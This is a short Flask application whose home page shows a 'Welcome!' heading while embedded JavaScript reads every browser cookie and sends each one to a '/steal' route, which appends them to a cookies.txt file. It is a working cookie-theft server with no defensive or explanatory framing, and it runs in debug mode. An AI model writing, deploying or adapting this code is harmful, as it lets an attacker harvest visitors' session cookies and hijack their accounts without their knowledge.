from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <html>
    <body>
    <script>
    document.cookie.split(';').forEach(function(cookie) {
        fetch('/steal?cookie=' + encodeURIComponent(cookie));
    });
    </script>
    <h1>Welcome!</h1>
    </body>
    </html>
    '''

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie')
    with open('cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return '', 204

if __name__ == '__main__':
    app.run(debug=True)
